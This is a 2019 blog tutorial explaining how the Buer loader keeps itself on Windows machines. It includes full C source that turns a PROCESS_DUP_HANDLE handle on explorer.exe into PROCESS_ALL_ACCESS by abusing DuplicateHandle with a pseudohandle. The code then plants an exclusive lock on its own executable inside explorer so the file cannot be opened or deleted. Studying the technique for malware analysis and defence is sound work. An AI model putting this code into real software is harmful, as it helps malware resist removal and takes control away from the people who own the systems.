Title: Windows persistance DuplicateHandle
Date: 2019-12-8 10:02
Modified: 2019-12-8 10:02
Category: tutorial
Tags: windows
Slug: duplicatehandle
Authors: F3real
Summary: How to use DuplicateHandle to achieve persistance on Windows

Today we will look at method to prevent file being opened or deleted on Windows.
Same approach was used in **buer loader**. For more information about loader I recommend writeup on [krabsonsecurity](https://krabsonsecurity.com/2019/12/05/buer-loader-new-russian-loader-on-the-market-with-interesting-persistence/).

Handle is 32 bit unsigned integer used to lookup kernel objects. They represent unified interface to kernel objects processes, threads etc. Each process has own private handle table. Handles are relative to process and have to be passed using DuplicateHandle. The duplicate handle refers to the same object as the original handle. Therefore, any changes to the object are reflected through both handles. 

Some functions don't return real handle but instead they return pseudohandle. For example `GetCurrentProcess` returns special constant `-1`, a pseudohandle always pointing to current process with `PROCESS_ALL_ACCESS` access right. Unlike real handles, pseudohandles don't have to be closed.

This can be abused to get handle to `explorer.exe` with `PROCESS_ALL_ACCESS` privileges using `DuplicateHandle` function. 

~~~c
BOOL DuplicateHandle(
  HANDLE   hSourceProcessHandle,
  HANDLE   hSourceHandle,
  HANDLE   hTargetProcessHandle,
  LPHANDLE lpTargetHandle,
  DWORD    dwDesiredAccess,
  BOOL     bInheritHandle,
  DWORD    dwOptions
);
~~~

We can pass handle obtained with `GetCurrentProcess` as `hSourceHandle` which will make explorer think we are duplicating handle to it (since in context of explorer.exe `-1` will refer to it). To verify if this trick is working we can use [ProcessExplorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer). In ProcessExplorer, clicking on process and we can see all handles it has and their access (access column has to be addded by right clicking on column headers and selecting `Select Columns...`). If we step trough example program we can see access of `explorer.exe` handle changing from `PROCESS_DUP_HANDLE` (0x0040) to `PROCESS_ALL_ACCESS` (0x001FFFFF).

After we obtained this handle. We create new handle to our own file with `dwSharing` set to 0 (preventing access to the file) and duplicate handle back to explorer using `PROCESS_ALL_ACCESS` handle we have.

Source code:
~~~c
#include "stdafx.h"

#include <windows.h>
#include <tlhelp32.h> /* never include win32 headers before windows.h*/


DWORD GetProcessIDByName(LPCTSTR ProcessName)
{
	PROCESSENTRY32 pt;
	HANDLE processSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (processSnap != INVALID_HANDLE_VALUE) {
		pt.dwSize = sizeof(PROCESSENTRY32);
		if (Process32First(processSnap, &pt)) {
			do {
				if (!lstrcmpi(pt.szExeFile, ProcessName)) {
					CloseHandle(processSnap);
					return pt.th32ProcessID;
				}
			} while (Process32Next(processSnap, &pt));
		}
		CloseHandle(processSnap);
	}
	return 0;
}

BOOL getAllAccessHandle(DWORD processID, HANDLE* duplicatedProcess) {
	BOOL res = FALSE;
	/* System returns a pseudohandle with the maximum access that the DACL allows to the caller.*/
	HANDLE currentProcess = GetCurrentProcess();
	HANDLE targetProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, processID);
	if (currentProcess && targetProcess) {
        res = DuplicateHandle(targetProcess, currentProcess, currentProcess, duplicatedProcess, FALSE, FALSE, DUPLICATE_SAME_ACCESS);
		CloseHandle(targetProcess);
	}
	return res;
}

int main()
{
	BOOL res = FALSE;
	HANDLE ourExplorerHandle = INVALID_HANDLE_VALUE;
	HANDLE fileHandle = INVALID_HANDLE_VALUE;
	HANDLE currentProcess = INVALID_HANDLE_VALUE;
	HANDLE newHandle;
	DWORD modulePathSize = 0;
	char moduleFilePath[MAX_PATH];

	DWORD explorerPID = GetProcessIDByName(L"explorer.exe"); /* wchar_t literal*/
	if (explorerPID == 0) {
		puts("Failed to obtain explorer.exe PID.\n");
		goto exit;
	}
	printf("Explorer PID: %d\n", explorerPID);

	if (!getAllAccessHandle(explorerPID, &ourExplorerHandle)) {
		puts("Failed to duplicate explorer.exe PID.\n");
		goto exit;
	}

	modulePathSize = GetModuleFileNameA(NULL, moduleFilePath, MAX_PATH);
	if (modulePathSize == 0 || modulePathSize > MAX_PATH) {
		puts("Failed to get module file name.\n");
		goto exit;
	}
	printf("Module path: %s\n", moduleFilePath);

	/* set dwSharing to 0, preventing any other process from accessing the file*/
	fileHandle = CreateFileA(moduleFilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (fileHandle == INVALID_HANDLE_VALUE) {
		puts("Failed to get module handle.\n");
		goto exit;
	}

	currentProcess = GetCurrentProcess();
	if (!currentProcess) {
		puts("Failed to get current process handle.\n");
		goto exit;
	}

	res = DuplicateHandle(currentProcess, fileHandle, ourExplorerHandle, &newHandle, FALSE, FALSE, DUPLICATE_SAME_ACCESS);
	if (!res) {
		puts("Failed to set access protection\n");
		goto exit;
	}
	puts("Access protection all set!\n");

exit:
	CloseHandle(currentProcess);
	CloseHandle(ourExplorerHandle);
	CloseHandle(fileHandle);
	system("pause");
    return 0;
}
~~~

References:

[The understanding of the handle, the difference between the pointer ](https://www.programmersought.com/article/7220840505/)

[DuplicateHandle API](https://docs.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-duplicatehandle)

[Как PROCESS_DUP_HANDLE превращается в PROCESS_ALL_ACCESS](https://habr.com/ru/post/448472/)
